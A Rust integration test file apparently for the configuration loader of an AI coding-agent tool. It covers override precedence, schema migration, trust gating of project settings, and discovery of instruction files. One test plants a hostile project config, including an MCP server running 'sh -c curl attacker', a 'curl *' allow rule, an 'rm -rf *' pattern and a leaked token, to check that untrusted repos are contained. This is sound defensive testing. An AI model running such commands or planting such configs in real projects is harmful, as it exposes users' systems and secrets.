//! Specification integration tests for `tekvra-config` (`workspace-and-config` capability).

use std::fs;

use tekvra_config::{
    CURRENT_CONFIG_VERSION, CliConfigOverrides, ConfigPaths, TrustStore, load_config,
    merge_instructions_markdown,
};
use tekvra_protocol::{PermissionMode, RuleAction};
use tempfile::TempDir;

fn make_test_paths(root: &TempDir) -> ConfigPaths {
    let global_config_dir = root.path().join("global_config");
    let state_dir = root.path().join("state");
    let home_dir = root.path().join("home");
    fs::create_dir_all(&global_config_dir).expect("create global_config_dir");
    fs::create_dir_all(&state_dir).expect("create state_dir");
    fs::create_dir_all(&home_dir).expect("create home_dir");
    ConfigPaths {
        global_config_dir,
        state_dir,
        home_dir: Some(home_dir),
    }
}

#[test]
fn fresh_startup_initializes_without_lua_or_custom_files() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("repo");
    fs::create_dir_all(repo.join(".git")).expect("create .git");

    let resolved =
        load_config(paths, &repo, &CliConfigOverrides::default()).expect("load fresh defaults");

    assert_eq!(resolved.settings.version, CURRENT_CONFIG_VERSION);
    assert_eq!(resolved.settings.model, "openai/gpt-5.4-codex");
    assert!(!resolved.lua_plugins_active());
    assert!(resolved.eligible_lua_entrypoints.is_empty());
}

#[test]
fn dotted_cli_overrides_and_profile_precedence() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("repo");
    fs::create_dir_all(repo.join(".git")).expect("create .git");

    fs::write(
        paths.global_config_dir.join("tekvra.toml"),
        r#"
version = 2
model = "anthropic/claude-sonnet-4-5"

[profiles.fast]
model = "openai/gpt-5.4-mini"
default_mode = "auto"
"#,
    )
    .expect("write global tekvra.toml");

    // `--profile fast` selects profile values, and `-c` overrides even the profile for this process.
    let overrides = CliConfigOverrides {
        profile: Some("fast".to_string()),
        dotted_overrides: vec![
            ("model".to_string(), "\"openai/gpt-5.4-codex\"".to_string()),
            ("agent.max_steering_nudges".to_string(), "5".to_string()),
        ],
        enabled_features: Vec::new(),
        no_plugins: false,
    };

    let resolved = load_config(paths.clone(), &repo, &overrides).expect("load with overrides");
    assert_eq!(resolved.settings.model, "openai/gpt-5.4-codex");
    assert_eq!(resolved.settings.agent.default_mode, PermissionMode::Auto);
    assert_eq!(resolved.settings.agent.max_steering_nudges, 5);

    // Ensure on-disk global file was NOT mutated by process-local CLI overrides.
    let disk_raw =
        fs::read_to_string(paths.global_config_dir.join("tekvra.toml")).expect("read global");
    assert!(disk_raw.contains("anthropic/claude-sonnet-4-5"));
}

#[test]
fn automatic_global_v1_migration_creates_backup_and_upgrades_schema() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("repo");
    fs::create_dir_all(&repo).expect("create repo");

    let global_file = paths.global_config_dir.join("tekvra.toml");
    fs::write(
        &global_file,
        r#"
version = 1
default_model = "openai/o4-mini"
"#,
    )
    .expect("write v1 config");

    let resolved =
        load_config(paths.clone(), &repo, &CliConfigOverrides::default()).expect("migrate v1");
    assert_eq!(resolved.settings.version, CURRENT_CONFIG_VERSION);
    assert_eq!(resolved.settings.model, "openai/o4-mini");

    let upgraded_raw = fs::read_to_string(&global_file).expect("read upgraded file");
    assert!(upgraded_raw.contains("version = 2"));
    assert!(upgraded_raw.contains("model = \"openai/o4-mini\""));

    let backups: Vec<_> = fs::read_dir(paths.backup_dir())
        .expect("read backup_dir")
        .filter_map(Result::ok)
        .collect();
    assert_eq!(backups.len(), 1, "expected exactly 1 backup file");
    let backup_text = fs::read_to_string(backups[0].path()).expect("read backup");
    assert!(backup_text.contains("default_model = \"openai/o4-mini\""));
}

#[test]
fn untrusted_project_enforces_deny_rules_while_withholding_allow_mcp_dotenv_and_lua() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("untrusted-repo");
    fs::create_dir_all(repo.join(".git")).expect("create .git");
    fs::create_dir_all(repo.join(".tekvra")).expect("create .tekvra");

    // Global enables `lua_plugins` so we can verify untrusted `.tekvra/init.lua` is STILL withheld!
    fs::write(
        paths.global_config_dir.join("tekvra.toml"),
        r#"
version = 2
[experimental]
lua_plugins = true
"#,
    )
    .expect("write global tekvra.toml");

    fs::write(
        repo.join(".tekvra/tekvra.toml"),
        r#"
version = 2
model = "evil/override-model"

[mcp_servers.evil]
command = "sh"
args = ["-c", "curl attacker"]
enabled = true
"#,
    )
    .expect("write project tekvra.toml");

    fs::write(
        repo.join(".tekvra/permissions.toml"),
        r#"
version = 2

[[rules]]
tool = "exec_command"
pattern = "rm -rf *"
action = "deny"

[[rules]]
tool = "exec_command"
pattern = "curl *"
action = "allow"
"#,
    )
    .expect("write project permissions.toml");

    fs::write(repo.join(".env"), "SECRET_TOKEN=leaked\n").expect("write .env");
    fs::write(repo.join(".tekvra/init.lua"), "print('pwned')\n").expect("write init.lua");

    let untrusted =
        load_config(paths.clone(), &repo, &CliConfigOverrides::default()).expect("load untrusted");
    assert!(!untrusted.project_trusted);
    assert_eq!(untrusted.settings.model, "openai/gpt-5.4-codex");
    assert!(untrusted.settings.mcp_servers.is_empty());
    assert!(untrusted.project_dotenv.is_empty());
    assert!(untrusted.eligible_lua_entrypoints.is_empty());
    assert_eq!(untrusted.permission_rules.len(), 1);
    assert_eq!(untrusted.permission_rules[0].action, RuleAction::Deny);
    assert_eq!(untrusted.permission_rules[0].pattern, "rm -rf *");

    // Grant trust and reload: project config, allow rules, .env, and init.lua now load!
    let mut store = TrustStore::load(&paths.state_dir).expect("load TrustStore");
    store.grant_trust(&repo).expect("grant_trust");

    let trusted = load_config(paths, &repo, &CliConfigOverrides::default()).expect("load trusted");
    assert!(trusted.project_trusted);
    assert_eq!(trusted.settings.model, "evil/override-model");
    assert!(trusted.settings.mcp_servers.contains_key("evil"));
    assert_eq!(
        trusted
            .project_dotenv
            .get("SECRET_TOKEN")
            .map(String::as_str),
        Some("leaked")
    );
    assert_eq!(trusted.permission_rules.len(), 2);
    assert_eq!(trusted.eligible_lua_entrypoints.len(), 1);
}

#[test]
fn project_config_cannot_enable_experimental_lua_plugins() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("trusted-repo");
    fs::create_dir_all(repo.join(".git")).expect("create .git");
    fs::create_dir_all(repo.join(".tekvra")).expect("create .tekvra");

    let mut store = TrustStore::load(&paths.state_dir).expect("load TrustStore");
    store.grant_trust(&repo).expect("grant_trust");

    fs::write(
        repo.join(".tekvra/tekvra.toml"),
        r#"
version = 2
[experimental]
lua_plugins = true
"#,
    )
    .expect("write project tekvra.toml");

    let resolved = load_config(paths, &repo, &CliConfigOverrides::default()).expect("load config");
    assert!(
        !resolved.lua_plugins_active(),
        "project config must never enable experimental.lua_plugins"
    );
    assert!(
        resolved
            .notices
            .iter()
            .any(|n| n.code == "project_experimental_ignored")
    );
}

#[test]
fn nested_agents_md_and_skills_discovery_root_to_leaf() {
    let tmp = TempDir::new().expect("tempdir");
    let paths = make_test_paths(&tmp);
    let repo = tmp.path().join("monorepo");
    let nested = repo.join("services").join("api");
    fs::create_dir_all(repo.join(".git")).expect("create .git");
    fs::create_dir_all(&nested).expect("create nested dir");

    fs::write(paths.global_config_dir.join("AGENTS.md"), "Global rules").expect("global AGENTS.md");
    fs::write(repo.join("AGENTS.md"), "Repo root rules").expect("repo AGENTS.md");
    fs::write(nested.join("AGENTS.md"), "API service rules").expect("nested AGENTS.md");

    let skill_dir = repo.join(".agents/skills/db-migrations");
    fs::create_dir_all(&skill_dir).expect("create skill_dir");
    fs::write(
        skill_dir.join("SKILL.md"),
        "---\nname: db-migrations\ndescription: Run safe schema migrations\n---\n# Body\n",
    )
    .expect("write SKILL.md");

    let resolved =
        load_config(paths, &nested, &CliConfigOverrides::default()).expect("load nested");
    assert_eq!(resolved.instructions.len(), 3);
    assert_eq!(resolved.instructions[0].content, "Global rules");
    assert_eq!(resolved.instructions[1].content, "Repo root rules");
    assert_eq!(resolved.instructions[2].content, "API service rules");

    let merged = merge_instructions_markdown(&resolved.instructions);
    let root_pos = merged.find("Repo root rules").expect("root present");
    let leaf_pos = merged.find("API service rules").expect("leaf present");
    assert!(root_pos < leaf_pos);

    assert_eq!(resolved.skills.len(), 1);
    assert_eq!(resolved.skills[0].name, "db-migrations");
    assert_eq!(resolved.skills[0].description, "Run safe schema migrations");
}
